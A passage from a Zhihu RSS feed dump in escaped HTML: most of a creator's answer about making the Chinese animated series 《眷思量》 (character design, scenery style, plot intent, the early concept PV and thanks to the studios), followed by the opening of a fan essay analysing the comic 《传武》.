data-rawheight=\"1016\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-416e62be0de140797d32dbc68e14ecd3\" data-watermark-src=\"v2-ed3f990fa882bc4607db310fd1c2f758\" data-private-watermark-src=\"v2-ce7b9ad0d839ff22996aa2e4edeaba32\"></p>\n<p>以及角色和角色之间的关系可以通过他们的长相就看出来。</p>\n<p>比如小镜玄到大镜玄是真的成长起来的模样。我不标注大家也能看出是他小时候。片中的孩子都是用这种方式来建模的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3caa00e2bd18042e714ff20ec1a90bc_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b3caa00e2bd18042e714ff20ec1a90bc\" data-watermark-src=\"v2-8978fa402ad5d22dc7eb6d050db119fa\" data-private-watermark-src=\"v2-24db6cb167e1316590f0928e0b3af83d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-713b2c6af3ffb1355e72e34440632372_720w.jpg?rss\" data-rawwidth=\"1926\" data-rawheight=\"1085\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-713b2c6af3ffb1355e72e34440632372\" data-watermark-src=\"v2-f8358988044d645cc0f8a296f18eb535\" data-private-watermark-src=\"v2-d60fb592382c05e9f131fb952cce9017\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c475dbb6b33b305d96a1727d9a17fee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c475dbb6b33b305d96a1727d9a17fee1\" data-watermark-src=\"v2-5ffffa3437c78a21e3068f6981704677\" data-private-watermark-src=\"v2-95f7e5280a20eba9902c086c419bfa6b\"></p>\n<p>再比如程染、程熔和两个儿子是真的在遗传学上有继承的五官特征等等。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f2e4ee60c810a41bc731d8b4df1f8a82_720w.jpg?rss\" data-rawwidth=\"1937\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2e4ee60c810a41bc731d8b4df1f8a82\" data-watermark-src=\"v2-28556adb4108df135d2192ef99f5a0d6\" data-private-watermark-src=\"v2-bba9cff5fb6024221ca6025f05e71125\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-caad8ebafdccf9622b310a835b465710_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-caad8ebafdccf9622b310a835b465710\" data-watermark-src=\"v2-7163c43e6b21fe527f465b8b44fc0a0e\" data-private-watermark-src=\"v2-1c650815dcc131c7be829a0c1e274405\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cae63ec4269943df6e1380bb2cc365b6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cae63ec4269943df6e1380bb2cc365b6\" data-watermark-src=\"v2-e4f2d01a29aec8cd9bfe0e6b9662b291\" data-private-watermark-src=\"v2-4ae27a63affc073a0b1e4bac32d99866\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dbbf57a8f020f6acd68af90893e0b2f0_720w.jpg?rss\" data-rawwidth=\"1911\" data-rawheight=\"1079\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dbbf57a8f020f6acd68af90893e0b2f0\" data-watermark-src=\"v2-edee37324a283a5c0e2f5a57f5ce4000\" data-private-watermark-src=\"v2-70c279043cea10a7b0f264597c13922e\"></p>\n<p>所以在创造这些角色的时候，我想通过塑造内在气质和外在形象结合的方式来诠释人物的真实感，再加上每场戏对光影的设计，赋予每个角色更立体的表达。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4a2f9b2b5d08841c9ca665658fe584dd_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4a2f9b2b5d08841c9ca665658fe584dd\" data-watermark-src=\"v2-71e4c8d6cc7e8e79f0bacb5a65039341\" data-private-watermark-src=\"v2-a1b13fbba49e999a9a19ad5ca6de5617\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-27b87c91d50486c36925482b51a94992_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-27b87c91d50486c36925482b51a94992\" data-watermark-src=\"v2-3873bd9962c173fdf63d63a3447058f6\" data-private-watermark-src=\"v2-f6bb3d6e62039c388d427fadd54bbb7c\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-68f84222b10d5bc3ece3e127e3bcd568_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68f84222b10d5bc3ece3e127e3bcd568\" data-watermark-src=\"v2-0df87a04e07b76475e8ee56d0f050b16\" data-private-watermark-src=\"v2-6df8d2d7ce9c8d025ba92444b28c5e4b\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2916f20cb31f206abf8033c9887d811e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2916f20cb31f206abf8033c9887d811e\" data-watermark-src=\"v2-23239cf11c26303768da70b101342dec\" data-private-watermark-src=\"v2-04503e5b66f936e28388d83b1cd1b54b\"></p>\n<p>再比如关于场景的创意思路，眷思量这个故事我想表达的是一个富有东方美学的架空幻想故事，所以场景首先要体现出中式的美感和风骨，但又不是真正的现实朝代感，所以我在影片中就尝试建立了一种新中式美学的思路，让建筑既有古意，又不同于实际的古代建筑本身。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b13fc48e7e4576a2d78b86d197db2d6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b13fc48e7e4576a2d78b86d197db2d6\" data-watermark-src=\"v2-73011cbc1ae854fe18485320291a26c8\" data-private-watermark-src=\"v2-fcbf8fc0d3466184b16f62b311337f2f\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c61a2295d4e2bbdab6ffd5146cba6b8_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0c61a2295d4e2bbdab6ffd5146cba6b8\" data-watermark-src=\"v2-f3f064cd38ee7cd5190bb2bf34c36180\" data-private-watermark-src=\"v2-29f719c39e8cb5067cdb8943581d1e36\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81086387d2ea9b766aac09562f49897b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-81086387d2ea9b766aac09562f49897b\" data-watermark-src=\"v2-aa919ba8a640da6bbab3ea7fa0f598ee\" data-private-watermark-src=\"v2-e7e40f6d5f682c5ea4e2fef8e12b274b\"></p>\n<p>其中藏典阁和议事堂这两座岛上代表建筑都是带有这种思路的神迹建筑设计。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-357128375a3eca820ea100bd6d7b966a_720w.jpg?rss\" data-rawwidth=\"1923\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-357128375a3eca820ea100bd6d7b966a\" data-watermark-src=\"v2-4ab7423a46db12545f27e1ae94b68723\" data-private-watermark-src=\"v2-d56250ba4eb9825cff8e441a7700b5fb\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5dd6f33de1f94e7b026192004d94bfaa_720w.jpg?rss\" data-rawwidth=\"1840\" data-rawheight=\"1035\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5dd6f33de1f94e7b026192004d94bfaa\" data-watermark-src=\"v2-0944e487093eba1143b5dcd77c705d7b\" data-private-watermark-src=\"v2-529aee02f1729fe05927cadfa550f9ed\"></p>\n<p>以上这些，大家在播出的影片中如果能感受到一些我就很欣慰了。</p>\n<p>从播之前忐忑的想知道大家的反应，到上线后被迫忙的焦头烂额顾不上了解，再到如今制作的工作正逐渐收尾，开始陆续回应多方的关注和交流。也很感谢知乎这次邀请我来跟大家好好交流一下。我就借这次机会说明下关于剧本身我的一些初始想法吧。</p>\n<p>1，先说说关于《眷思量》的主线剧情。虽然我之前都说过，但可能很多人还是没有看到，于是刚好在大知乎也说下！</p>\n<p>在我心中，这是一部全员搞事业的剧，爱情是辅助，而且里面还有亲情和友情等美好的情感。所以并不会从事业番忽然变成纯恋爱番哦。想看恋爱的大家多多二创吧～我也很期待看到大家发挥～</p>\n<p>就像《柯南》主线是断案，《棋魂》主线是围棋，《眷思量》的主线是讲述岛上以男女主为代表视角的一群年轻人如何突破枷锁寻找心中自由的故事。且感情设置都是1V1，不分叉不开后宫，谢谢！</p>\n<p>可能因为我心里这些角色都很美，可以说是个全员美人的颜番了，谁让我是个会建模的终极颜狗呢=v=。。。。，这个优势不充分利用下我怎能甘心，于是我也尽量在把美感做到我想要的程度。以及后续还会有我心中其他类型的极品美帅酷的角色登场，当然，前提是如果能继续往下做的话。。。。。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a4d5ca4a1ae6175cb2771cf061da5d8c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"840\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4d5ca4a1ae6175cb2771cf061da5d8c\" data-watermark-src=\"v2-d88fbe8fff2a361485846edc1f7496a5\" data-private-watermark-src=\"v2-f36e55826343a98fbe73c7101cfd5676\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7704cd69e702c6cc14058cf30ee88b25_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"889\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7704cd69e702c6cc14058cf30ee88b25\" data-watermark-src=\"v2-451bac8031e0b2480d229675568357d8\" data-private-watermark-src=\"v2-e1072c3a7f91f7bcd6615e5819d5d970\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f231adc612eb9133c086851f7bcae2b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"669\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4f231adc612eb9133c086851f7bcae2b\" data-watermark-src=\"v2-5e3d36a7074e6493a34de6c6157b7c19\" data-private-watermark-src=\"v2-331d26fe60fa288d152dab8bf24d1a6a\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fc30fa01dc933529351b49a141d477ed_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"552\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fc30fa01dc933529351b49a141d477ed\" data-watermark-src=\"v2-0584282a79d6362a9a69dbe3f19b1bb7\" data-private-watermark-src=\"v2-b88a0ab7f1c5e369d4ed22126f68d490\"></p>\n<p>所以大家看到漂亮角色可能都会有磕CP啊拉郎啊之类的想法，这我能理解，也拦不住，但希望大家和和气气快快乐乐地磕，圈地自萌，不要因此产生无谓的纷争。</p>\n<p><br></p>\n<p>2，关于某些观众可能误会这是一部大女主剧的问题，从19年到21年，我也是通过各种自己能接触到的渠道重申多次。思量这部剧不是大女主剧，男女主都是重要的表达视角。</p>\n<p>以及因为角色的制作先后顺序不同，所以露面的前后顺序也不一样。可能导致有了解不全的人误解了。在这里也说明一下。</p>\n<p>眷眷的每个角色对我来说都是独一无二的，对故事都很重要。他们的出场是服从剧情的安排，在正片里的出现都是为推动剧情的发展。</p>\n<p>而在主线故事之外，我也给某些角色写过专属番外，如果以后时机成熟，可以看大家诉求，再决定是否为某个角色量身打造番外篇。</p>\n<p>我做眷眷的初衷就是把我脑海里这个原型故事完整表达好，每个绝美的人物都塑造好，他们在其中都很优秀，有各自的作用。只要大家还喜欢看，只要公司能维持正向运转，我会尽我所能一直做下去直到大结局的。</p>\n<p>3，然后来聊聊思量初相见时期的故事吧，因为很多人是开播后才注意到有思量这部剧的，所以难免对此充满疑惑。</p>\n<p>眷思量开始启动之初，面临一个很现实很残酷的问题：这是一个原创作品，无IP支持，无成熟商业模式，各方都在观望，我必须拿出东西来说服更多的人来支持这个项目。</p>\n<p>所以我决定先做一个眷思量的概念PV，让别人能以最直观的方式看到我脑海里的东西。</p>\n<p>在选择PV出场角色的时候，我选择了奉眠。之所以选择眠眠有两个原因：</p>\n<p>      1，我之前微博提过，因为她是思量故事里，第一个以神族身份和形态登场的角色，其他角色第一季的时候都苦哈哈的在思量岛渡劫。只有眠眠初登场就一直持续着她神秘华丽高贵的样子。我觉得是个可以说明我思量整体视觉调性的角色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b1f2d509d3cf7b07baacd493f42a042_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1407\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b1f2d509d3cf7b07baacd493f42a042\" data-watermark-src=\"v2-c3251d68533e541455a7e4c953412e8e\" data-private-watermark-src=\"v2-3692f8f0c94014bf0b2a90ec0c22e304\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-63a9e5096431ab5e2042c5bcf6aaf148_720w.jpg?rss\" data-rawwidth=\"1784\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-63a9e5096431ab5e2042c5bcf6aaf148\" data-watermark-src=\"v2-f6e29f32b4c543dd226035622eb03b73\" data-private-watermark-src=\"v2-ae915d4b83dd2b60dd235bf074e0b5ee\"></p>\n<p>        2，主角在我开始动手做PV的当时，模型材质还没完全做完，但很多人着急看效果，项目已经不能等了。而且眠眠可以充分展示我们项目在模型方面的技术水平。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-146c920eb20052e6f86d5a626b3c1ee4_720w.jpg?rss\" data-rawwidth=\"1700\" data-rawheight=\"718\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-146c920eb20052e6f86d5a626b3c1ee4\" data-watermark-src=\"v2-5670fa87e67affbafdf0840bb95939a8\" data-private-watermark-src=\"v2-dcf7b89d7b66f49a49e9f25012bf6899\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f07c110c438f59c5fb1eba0390ae124c_720w.jpg?rss\" data-rawwidth=\"1725\" data-rawheight=\"723\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f07c110c438f59c5fb1eba0390ae124c\" data-watermark-src=\"v2-1ba6a7d996edd81609a81e80b1621275\" data-private-watermark-src=\"v2-3c772aad271b608f8bb817aa6efd5968\"></p>\n<p>2019年3月，我们上线的第一支PV。这支PV在微博和B站皆获得了过百万的播放量，收获了热烈的反馈，增加了各方的信心，也让我有了足够的支持把思量这个项目继续下去。</p>\n<p>当然以上这只是我在做思量时遇到的无数难关之一，而直到此时，我也不知道能不能继续把思量做完。让大家完完整整看到这个故事。</p>\n<p>但不管如何，在眷思量小有成绩之际，我要感谢很多人~</p>\n<p><br></p>\n<p>首先是我们炎央文化可爱的小伙伴们！他们中很多人怀抱着对我的信任，已经陪我走过了三年四年的时间，每个人都对作品付出了大量的心血。炎央文化的主创团队是眷思量这个作品的创作核心。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6f486ca8e6ff713dd92511e4c7a92879_720w.jpeg?rss\" data-rawwidth=\"1619\" data-rawheight=\"1180\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6f486ca8e6ff713dd92511e4c7a92879\" data-watermark-src=\"v2-819ead9a42558832b7094143d7507b7a\" data-private-watermark-src=\"v2-b49b649c6d7976f0726b310c6ebeeea0\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5bdef594a4c58c8661cb0b29bd5e6a04_720w.jpg?rss\" data-rawwidth=\"1896\" data-rawheight=\"1711\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-5bdef594a4c58c8661cb0b29bd5e6a04\" data-watermark-src=\"v2-982dc84b37739a70a30f01737f8febe2\" data-private-watermark-src=\"v2-e134fb6b7801c212f0803b7024e0f3de\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e4d03f5115799ebe9c0c641adec86f4c_720w.jpg?rss\" data-rawwidth=\"2135\" data-rawheight=\"859\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e4d03f5115799ebe9c0c641adec86f4c\" data-watermark-src=\"v2-1c95e1f1566877e9ae4e3b32d50cbb49\" data-private-watermark-src=\"v2-930ba25728c21932f2188fe405c0f61c\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-97d907a0e33f845658f0869b51908a02_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2555\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-97d907a0e33f845658f0869b51908a02\" data-watermark-src=\"v2-82bdb1b8ed1cddefb2e13c892b34e778\" data-private-watermark-src=\"v2-f123969269bf113cbefc16bcf621e226\"></p>\n<p>编剧组的朋友陪我研究剧本，梳理原著内容逻辑，跨年时还开编剧会到深夜，讨论的乐此不疲。</p>\n<p>制片组的小可爱们细心梳思量每个制作环节的每个细节，事无巨细的盯紧各方面进度，奋战在进度第一线协调各公司，努力保证项目推进效率。</p>\n<p>美术组的小伙伴们配合我一遍遍出服饰构思图，只为接近最贴合原著的角色身份和设计思路。在我选定后又精心绘制服装拆解图，供中期的小伙伴能看明白创意细节才好执行成模型。</p>\n<p>分镜组的小伙伴们在我每次讲戏、分解镜头思路后都快速积极的调整串联，只为达到画面顺畅叙事清晰，让每个角色都有最合适的亮相和剧情情节空间展现他们的喜怒哀乐。</p>\n<p>执行导演们负责将我对每集每个镜头的各种细节想法事无巨细的还原实施到影片中。对镜头、动画、解算等串联把控都非常尽心尽力。对音乐音效的编排创意也都非常有独到见解。剪辑节奏把控也深得我心～</p>\n<p>还要特别感谢吾立方动画的诸位老铁们！！我和吾立方的胡总渊源颇深，一直是业内互相欣赏、守望相助的动画友人，终于在《少锦》时正式开启合作，并通过通力合作建立了更加深的了解和相互信任，深知他们是一个踏实、负责、专业的团队。因此做《眷思量》的时候，第一时间邀胡总一起合作。</p>\n<p>模型组的小伙伴经常陪我加班到深夜雕模型，我多次龟毛的调整要求他们都没有不耐烦，才让资产能有这样协同统一。</p>\n<p>动画组的小伙伴对我零零碎碎的小要求都尽心尽力完成好，让角色动作真的靠近我心里想的样子。</p>\n<p>灯光组的小伙伴对我们非番剧打光级别的要求和一堆反馈回去的灯光设计图，都有努力执行并且保质保量让人欣喜。</p>\n<p>合成组的小伙伴对素材整合协调，我知道一个特效镜头素材动辄十几个G或者几十个G的文件你们肯定很头痛，但从不跟我抱怨。</p>\n<p>我在工作中的确龟毛要求高，但吾立方各组的小伙伴们都在努力配合我协助完成眷思量的各种环节，真的很感谢吾立方对于炎央文化和眷眷的支持！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f4bf572a9192666641411d3857060570_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f4bf572a9192666641411d3857060570\" data-watermark-src=\"v2-04742be326a8181420eba6076f81c898\" data-private-watermark-src=\"v2-3bb6ae9575e02cf6188a70967e765a87\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c770c22a82439216652d0d272a5a665c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c770c22a82439216652d0d272a5a665c\" data-watermark-src=\"v2-4ff178f6c958848b2b1cc96d4ef8f3ab\" data-private-watermark-src=\"v2-aaa352a3451a303d0b4ab30e8b4c92af\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-30495d54466748b151ea26652f0c068e_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"843\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-30495d54466748b151ea26652f0c068e\" data-watermark-src=\"v2-0d68eb763c066de06a752ac4de3bcccf\" data-private-watermark-src=\"v2-776252e9d69b84b76fa81345577a4017\"></p>\n<p>感谢我的特效指导老师！眷思量里开场及难度最高的特效是找了专门的动画电影特效团队几何二进制做的，他们的特效总监也是眷思量的特效总监郭老师。在电影《哪吒魔童降世》和《姜子牙》里他们都负责了难度最高的特效之一。我与郭老师是一见如故，顺利解决了很多特效难题！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a06787323c135c8c5a62bb6af81c4833_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"697\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a06787323c135c8c5a62bb6af81c4833\" data-watermark-src=\"v2-27b7d17d4da244240ab5b3aba3f9999d\" data-private-watermark-src=\"v2-abbb24633ba9fad4ce864fc6fc473f27\"></p>\n<p>超级感谢我的配音导演姜SIR，作为光合积木的创始人，姜sir尽心尽力的帮我寻找最适合思量的声音。并出色的完成了整部剧配音的指导和设计，让我也从中学到了很多！不愧是我敬重的大神级业界前辈。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-868c5075e6b43d362aa83431df44995a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"940\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-868c5075e6b43d362aa83431df44995a\" data-watermark-src=\"v2-bfcff05abfe409bc52bc5c56ee12fcde\" data-private-watermark-src=\"v2-245d8bafe870e2f2e542736efc9e972a\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-351ea4be2c9e2113cc840c84decc2975_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-351ea4be2c9e2113cc840c84decc2975\" data-watermark-src=\"v2-e8489e53bda3a49ff6145c8b7f53b82d\" data-private-watermark-src=\"v2-6b1186366347b58451b970013cc40ea4\"></p>\n<p>感谢负责音乐制作的作曲家白鸟老师，和白鸟是多年的老朋友了，这次的合作非常和我心意，但把他折腾够呛～～作曲家先生非常敬业优秀的完成了整个OST的创作，每首曲子都描摹出了思量故事里的各种情景。再配上师妹刘美麟的绝美声线献唱，深得我心。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4b791e1fa8fa1da856d8c276c0139ab5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1422\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4b791e1fa8fa1da856d8c276c0139ab5\" data-watermark-src=\"v2-8617ab2fc2982ac7e46e9c587ce30589\" data-private-watermark-src=\"v2-2573e841dd3f976097977772238deb31\"></p>\n<p>当然还有我可爱的量子们，感谢你们的等待。还有给我的贴心留言，支持在默默赶工的我，每次看到这些留言，我就又有赶工的动力。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fd8eb4c688b8c0f3cc12ea61e166e61b_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fd8eb4c688b8c0f3cc12ea61e166e61b\" data-watermark-src=\"v2-ad7f7fb0547e16e7745edbbba0bb62eb\" data-private-watermark-src=\"v2-d7ec33d7d8072c994bba379c12ba775b\"></p>\n<p>然后回到我的专业领域。 第一季我个人其实有不少不满意的地方。但因为时间限制和档期要求，从剧本到最后成片很多方面来不及深抠。而且开始做项目由于能调动的资源太少，且项目没有任何知名度和对人才的吸引力，所以各方面都找不到人帮忙，希望这个情况能在第二季及后续可能进行的大电影制作里根据预算情况逐步改善，争取后面能吸引到喜欢思量的能人加入，把项目做得更好吧。</p>\n<p>以及，不得不提的是，因为思量能不能一直做下去，跟每集播放量正相关，播放量的多少直接关系到后面集数平台宣推资源争取和下一季制作成本的洽谈，所以从现在来看，各方面真的是个未知数。。。我也只能做好我能做到的，其他方面就看造化啦。所以希望喜欢思量的小伙伴们能从通过各种官方渠道支持我们，这样我们才能收到相应收益把项目持续下去，不要去支持盗版TOT做动画真是很非常不易，原创动画更是无比艰难，请大家且看且珍惜~T--T。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-232ef6b5c1fddac649531711b33bad86_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-232ef6b5c1fddac649531711b33bad86\" data-watermark-src=\"v2-23289ef954bb02f19986dde23385b656\" data-private-watermark-src=\"v2-21727b90abf743de42539af321e7ce78\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc16a07105de605bb33358e1050fab24_720w.jpg?rss\" data-rawwidth=\"1895\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc16a07105de605bb33358e1050fab24\" data-watermark-src=\"v2-d650246c828be010086a9c47f398392a\" data-private-watermark-src=\"v2-41fe2457cae80a674e181b91c963c64a\"></p>\n<p>最后，我想说的是，不管我能不能争取到继续做下去的资金和资源，都希望现在上线播出的这季作品可以让每个参与过眷思量的人，每个喜欢眷思量的小伙伴，都能说一句——值得！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">12 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266714288?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么我们对过去的动画评价要比现在的好？</a><br><a href=\"http://www.zhihu.com/question/25531649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请评价贱鸡行事系列动画？</a><br>\n","link":"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产漫画《传武》？","date":"2021-07-07 03:00:11","description":"\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《传武》漫画为基础做的简单猜想；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，神魔以及各门派的简介，都是仅在《传武》世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i><br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-c2221ef6c59fff3a021711c42f7e16b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"638\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-c2221ef6c59fff3a021711c42f7e16b8\" data-watermark-src=\"v2-317cee823ac8be9d8a7d33b38a7b3ee5\" data-private-watermark-src=\"\"></p>\n<h2><i>目录</i></h2>\n<p><b><i>引子</i></b></p>\n<p><b><i>《传武》中的神话设定</i></b></p>\n<p><i>1.《西游记》观音小分队的细节</i></p>\n<p><i>2.《封神演义》红尘仙的世俗依靠</i></p>\n<p><i>3.《水浒传》故事背后的故事</i></p>\n<p><i>4.漫画背后的微缩历史</i></p>\n<p><b><i>《传武》中的山海经设定</i></b></p>\n<p><i>1.仁兽驺虞的变态之路</i></p>\n<p><i>2.雁门关外的火凤燎原</i></p>\n<p><i>3.青龙背负的四大灾星</i></p>\n<p><b><i>《传武》中的克苏鲁设定</i></b></p>\n<p><i>1.黄衣之王与他的黄沙眷属</i></p>\n<p><i>2.克苏鲁神话外的克苏鲁</i></p>\n<p><b><i>《传武》中的戏剧化设定</i></b></p>\n<p><i>1.二百年一轮的庄周梦蝶</i></p>\n<p><i>2.樊家的王之宝库</i></p>\n<p><i>3.六道轮回间的相生相克</i></p>\n<p><b><i>个人感想</i></b></p>\n<p><br></p>\n<hr>\n<p><br></p>\n<h2><b>引子</b></h2>\n<p>无论怎么评价，传武注定是一部难以简单概括的作品，这并不是说传武的故事太过复杂，而是从整体的阅读体验来说的；就我个人而言，我一共系统的阅读过三次《传武》；第一次是跟随连载，大概从第一部的白骨洞剧情线一直跟到现在，回过头来看，中间确实会有出现跳戏或者自以为读懂其实不然的情况出现；不过抛开当时对部分细节的错误理解，《传武》也是一部初体验非常爽快的漫画；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-185a3830654f485e0640b2f94588cd66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1158\" data-rawheight=\"386\" data-watermark=\"watermark\" data-original-src=\"v2-185a3830654f485e0640b2f94588cd66\" data-watermark-src=\"v2-821e062317d4f571c50fa31c25fd574a\" 